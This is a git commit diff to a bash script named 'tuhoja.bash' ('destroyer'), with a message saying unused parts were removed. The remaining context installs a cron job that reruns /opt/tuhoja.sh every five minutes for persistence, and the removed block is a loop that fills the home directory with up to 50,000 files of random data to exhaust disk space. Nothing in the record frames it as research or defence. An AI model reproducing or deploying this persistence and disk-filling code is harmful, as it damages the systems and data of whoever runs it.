0e8664aaa25918c453aad49fb4b2466754b2204c
Poliisi5 <hermannipinomaki@gmail.com>
2025-01-13 13:51:40 +0200

    Removed non used things

--- tuhoja.bash
+++ tuhoja.bash
@@ -21,17 +21,3 @@ else
   chmod +X $PERSISTENCE_DIR
   (crontab -l 2>/dev/null || true; echo "*/5 * * * * /bin/bash /opt/tuhoja.sh") | crontab -
 fi
-if test -f $TEMPFILE ; then
-  $COUNTER = cat $TEMPFILE
-else
-  echo 0 > $TEMPFILE
-fi
-for (( c=0; c<=50000; c++ ))
-do
-  COUNTER=$[$(cat $TEMPFILE) + 1]
-  echo $COUNTER > $TEMPFILE
-  head -c 512000 /dev/urandom | base64 > ~/$COUNTER
-  echo $COUNTER
-done
-rm -f $TEMPFILE
-
